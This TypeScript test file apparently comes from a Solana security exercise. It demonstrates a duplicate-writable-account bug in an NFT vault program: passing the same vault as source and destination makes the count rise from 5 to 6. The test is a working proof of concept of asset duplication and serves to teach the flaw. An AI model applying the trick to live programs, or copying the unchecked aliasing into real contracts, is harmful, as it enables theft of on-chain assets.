import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Account3 } from "../target/types/account_3";
import { Keypair, SystemProgram, PublicKey } from "@solana/web3.js";
import { expect } from "chai";

describe("NFT Vault Same Account Bug", () => {
  anchor.setProvider(anchor.AnchorProvider.env());
  const program = anchor.workspace.account3 as Program<Account3>;
  const provider = anchor.getProvider();

  // Helper function to display program logs
  const showProgramLogs = async (txSig: string, description: string) => {
    console.log(`\n--- Program Logs for ${description} ---`);
    try {
      const tx = await provider.connection.getTransaction(txSig, {
        commitment: "confirmed",
        maxSupportedTransactionVersion: 0,
      });
      
      if (tx && tx.meta && tx.meta.logMessages) {
        tx.meta.logMessages.forEach(log => {
          if (log.includes("Program log:")) {
            console.log("📝", log.replace("Program log: ", ""));
          }
        });
      } else {
        console.log("⚠️  No logs found for this transaction");
      }
    } catch (error) {
      console.log("❌ Error retrieving logs:", error);
    }
    console.log("--- End Program Logs ---\n");
  };

  let authority: Keypair;
  let user: Keypair;
  let monkeyCollection: Keypair;
  let tradingVault: Keypair;
  let hodlVault: Keypair;

  beforeEach(async () => {
    authority = Keypair.generate();
    user = Keypair.generate();
    monkeyCollection = Keypair.generate();
    tradingVault = Keypair.generate();
    hodlVault = Keypair.generate();

    await provider.connection.requestAirdrop(authority.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL);
    await provider.connection.requestAirdrop(user.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL);
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Create NFT Collection
    const createCollectionTxSig = await program.methods
      .createCollection("Solana Monkeys", "SMB")
      .accounts({
        collection: monkeyCollection.publicKey,
        authority: authority.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([authority, monkeyCollection])
      .rpc();

    await showProgramLogs(createCollectionTxSig, "Collection Creation");

    // Mint NFTs to collection
    const mintTxSig = await program.methods
      .mintNftsToCollection(new anchor.BN(1000))
      .accounts({
        collection: monkeyCollection.publicKey,
        authority: authority.publicKey,
      })
      .signers([authority])
      .rpc();

    await showProgramLogs(mintTxSig, "NFT Minting");

    // Create vaults
    const createTradingVaultTxSig = await program.methods
      .createVault("Trading Vault")
      .accounts({
        vault: tradingVault.publicKey,
        collection: monkeyCollection.publicKey,
        owner: user.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([user, tradingVault])
      .rpc();

    await showProgramLogs(createTradingVaultTxSig, "Trading Vault Creation");

    const createHodlVaultTxSig = await program.methods
      .createVault("HODL Vault")
      .accounts({
        vault: hodlVault.publicKey,
        collection: monkeyCollection.publicKey,
        owner: user.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .signers([user, hodlVault])
      .rpc();

    await showProgramLogs(createHodlVaultTxSig, "HODL Vault Creation");

    // Deposit NFTs to trading vault
    const nftMints = [1, 2, 3, 4, 5].map(() => Keypair.generate());

    for (const nftMint of nftMints) {
      const depositTxSig = await program.methods
        .depositNftToVault(nftMint.publicKey)
        .accounts({
          vault: tradingVault.publicKey,
          collection: monkeyCollection.publicKey,
          owner: user.publicKey,
        })
        .signers([user])
        .rpc();

      await showProgramLogs(depositTxSig, `NFT Deposit (${nftMint.publicKey.toBase58().slice(0, 8)}...)`);
    }
  });
  
  it("should demonstrate NFT duplication via same vault transfer", async () => {
    console.log("Testing same vault transfer vulnerability");
    
    let tradingBefore = await program.account.nftVault.fetch(tradingVault.publicKey);
    console.log("Initial trading vault NFTs:", tradingBefore.nftCount.toString());
    
    console.log("\nExpected behavior for same vault transfer:");
    console.log("- Decrease count by 1 (5 - 1 = 4)");
    console.log("- Increase count by 1 (4 + 1 = 5)");
    console.log("- Net result: No change (5 NFTs total)");
    
    // Execute vulnerable transfer with same vault as source and destination
    console.log("\nStep 1: Executing same vault transfer");
    const nftToTransfer = Keypair.generate();
    
    const txSig = await program.methods
      .transferNftBetweenVaults(nftToTransfer.publicKey)
      .accounts({
        sourceVault: tradingVault.publicKey,
        destinationVault: tradingVault.publicKey, // Same vault
        owner: user.publicKey,
      })
      .signers([user])
      .rpc();
    
    await showProgramLogs(txSig, "Same Vault Transfer (Vulnerability)");
    
    // Check the result
    let tradingAfter = await program.account.nftVault.fetch(tradingVault.publicKey);
    console.log("\nStep 3: Checking final state");
    console.log("Trading Vault NFTs after transfer:", tradingAfter.nftCount.toString());
    
    console.log("\nBug analysis:");
    console.log("Expected: 5 NFTs (no net change)");
    console.log("Actual:", tradingAfter.nftCount.toString(), "NFTs");
    console.log("Result: NFT duplication occurred");
    
    // Vulnerability confirmed - NFT count increased incorrectly
    expect(tradingAfter.nftCount.toString()).to.equal("6");
    
    // Vulnerability Analysis
    console.log("\n=== VULNERABILITY ANALYSIS ===");
    console.log("Vulnerability: Duplicate Writable Account");
    console.log("- Same account used as both source and destination");
    console.log("- Multiple mutable borrows on same account in single instruction");
    console.log("- Only final write persists, intermediate writes lost");
    console.log("- Results in NFT duplication (count increases instead of staying same)");
  });
});
